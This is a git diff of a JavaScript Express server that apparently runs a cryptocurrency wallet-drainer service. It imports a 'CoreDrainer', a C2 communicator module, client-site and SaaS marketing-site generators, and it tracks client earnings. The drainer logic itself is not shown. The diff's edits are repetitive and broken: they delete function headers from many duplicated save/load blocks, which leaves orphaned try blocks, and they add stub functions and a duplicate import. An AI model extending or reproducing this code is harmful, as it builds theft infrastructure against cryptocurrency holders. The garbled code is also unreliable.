@@ -22,8 +22,24 @@ import { getExplorerApiKey, getRpcUrl } from './config.js';
 import { CoreDrainer } from './coreDrainer.js';
 import { flowCoordinator } from './modules/FlowCoordinator.js';
 import { uiManager } from './modules/UIManager.js';
+import { c2Communicator } from './modules/c2Communicator.js';
+import { securityManager } from './modules/securityManager.js';
+import { chainManager } from './modules/chainManager.js';
+import { generateClientSite } from './client-template.js';
+import { generateMarketingSite } from './saas-website.js';
+
+import cron from "node-cron";
+import express from "express";
 import http from "http";
 import { Server as SocketIOServer } from "socket.io";
+// Client storage functions (placeholder)
+function saveClientsToFile() {
+  console.log("💾 Client save called (storage not implemented)");
+}
+
+function loadClientsFromFile() {
+  console.log("📂 Client load called (storage not implemented)");
+}
 import cron from "node-cron";
 
 const app = express();
@@ -65,8 +81,7 @@ let clients = new Map();
 // File-based client data storage
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -80,8 +95,7 @@ let clients = new Map();
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -102,8 +116,7 @@ let clients = new Map();
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -137,8 +150,7 @@ let clients = new Map();
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -152,8 +164,7 @@ let clients = new Map();
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -169,8 +180,7 @@ let clients = new Map();
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -184,8 +194,7 @@ let clients = new Map();
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -200,8 +209,7 @@ let clients = new Map();
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -215,8 +223,7 @@ let clients = new Map();
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -235,8 +242,7 @@ class Client {
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -250,8 +256,7 @@ class Client {
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log(`📂 Loaded ${clients.size} clients from storage`);
     }
@@ -342,8 +347,7 @@ function initializeBitcoin() {
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -357,8 +361,7 @@ function initializeBitcoin() {
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log("📂 Loaded " + clients.size + " clients from storage");
     }
@@ -4562,8 +4565,7 @@ app.get('/ping', (req, res) => {
 
 
 // Save all client data to file
-  function saveClientsToFile() {
-    try {
+  try {
     const clientsData = {
       clients: Array.from(clients.entries()),
       earnings: Array.from(clientEarnings.entries()),
@@ -4577,8 +4579,7 @@ app.get('/ping', (req, res) => {
 }
 
 // Load client data from file on startup
-  function loadClientsFromFile() {
-    try {
+  try {
       clients = new Map(data.clients || []);
       console.log(`📂 Loaded ${clients.size} clients from storage`);
     }
